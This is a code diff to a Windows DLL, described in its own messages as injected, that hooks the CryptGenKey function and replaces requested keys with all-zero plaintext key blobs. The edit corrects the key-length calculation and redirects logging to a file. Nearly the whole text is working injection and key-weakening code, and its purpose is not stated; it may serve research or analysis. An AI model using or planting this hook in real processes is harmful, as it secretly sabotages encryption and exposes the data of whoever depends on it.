@@ -9,6 +9,7 @@ bool gCryptHooked = false;
 typedef BOOL(WINAPI *CryptGenKeyPtr)(_In_  HCRYPTPROV, _In_  ALG_ID, _In_  DWORD, _Out_ HCRYPTKEY*);
 CryptGenKeyPtr SavedCryptGenKey = nullptr;
 
+FILE* log;
 
 struct PLAINTEXTKEYBLOB_t {
 	BLOBHEADER hdr;
@@ -17,15 +18,15 @@ struct PLAINTEXTKEYBLOB_t {
 };
 
 BOOL GenWeakKey(DWORD keySize, ALG_ID algid, BYTE** blob, DWORD* blobSize) {
-	*blobSize = sizeof(PLAINTEXTKEYBLOB_t) + keySize;
+	*blobSize = sizeof(PLAINTEXTKEYBLOB_t) + keySize/8;
 	PLAINTEXTKEYBLOB_t* keyBlob = (PLAINTEXTKEYBLOB_t*)malloc(*blobSize);
 	*blob = (BYTE*)keyBlob;
 	keyBlob->hdr.bType = PLAINTEXTKEYBLOB;
 	keyBlob->hdr.bVersion = CUR_BLOB_VERSION;
 	keyBlob->hdr.reserved = 0;
 	keyBlob->hdr.aiKeyAlg = algid;
-	keyBlob->dwKeySize = keySize;
-	memset(keyBlob->rgbKeyData, 0, keySize);
+	keyBlob->dwKeySize = keySize/8;
+	memset(keyBlob->rgbKeyData, 0x00, keySize/8);
 
 	return TRUE;
 }
@@ -37,19 +38,19 @@ BOOL WINAPI CryptGenKeyHook(
 	_Out_ HCRYPTKEY  *phKey) 
 {
 
-	puts("In CryptGenKeyHook...");
+	fputs("In CryptGenKeyHook...", log);
 
 	DWORD keySize = dwFlags >> 16;
 	if (keySize) {
 		BYTE* keyBlob;
 		DWORD keyBlobSize;
 		if (GenWeakKey(keySize, Algid, &keyBlob, &keyBlobSize)) {
-			printf("Generate weak key, size: %d, blob: %d", keySize, keyBlobSize);
+			fprintf(log, "Generate weak key, size: %d, blob: %d\n", keySize, keyBlobSize);
 			return CryptImportKey(hProv, keyBlob, keyBlobSize, 0, 0, phKey);
 		}
 	}
 
-	puts("Using true CryptGenKey...");
+	fputs("Using true CryptGenKey...", log);
 	return SavedCryptGenKey(hProv, Algid, dwFlags, phKey);
 }
 
@@ -72,12 +73,17 @@ void UnhookCrypt() {
 INT APIENTRY DllMain(HMODULE hDLL, DWORD Reason, LPVOID Reserved) {
 	switch (Reason) {
 	case DLL_PROCESS_ATTACH:
-		printf("Hello from injected dll [%x], reason %d\n", (unsigned int)hDLL, Reason);
+		log = fopen("hook.log", "a");
+		fprintf(log, "Hello from injected dll [%x], reason %d\n", (unsigned int)hDLL, Reason);
 		HookCrypt();
 		break;
 	case DLL_PROCESS_DETACH:
-		printf("Unhooking injected dll...");
+		fputs("Unhooking injected dll...", log);
 		UnhookCrypt();
+		if (log) {
+			fclose(log);
+			log = 0;
+		}
 		break;
 	}
 	return TRUE;
